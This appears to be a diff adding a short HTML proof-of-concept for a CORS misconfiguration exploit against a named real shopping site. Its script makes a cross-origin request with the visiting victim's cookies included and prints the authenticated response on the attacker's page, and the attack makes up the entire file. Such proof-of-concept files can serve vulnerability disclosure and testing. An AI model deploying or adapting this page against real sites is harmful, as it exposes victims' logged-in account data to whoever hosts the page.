@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h2>Fetching Authenticated Data from OPPO Shop...</h2>
+  <pre id="output">Loading...</pre>
+
+  <script>
+    fetch("https://www.opposhop.cn", {
+      method: "GET",
+      credentials: "include" // Include cookies/session of victim
+    })
+    .then(response => response.text())
+    .then(data => {
+      document.getElementById("output").innerText = data;
+    })
+    .catch(error => {
+      document.getElementById("output").innerText = "Request failed: " + error;
+    });
+  </script>
+</body>
+</html>
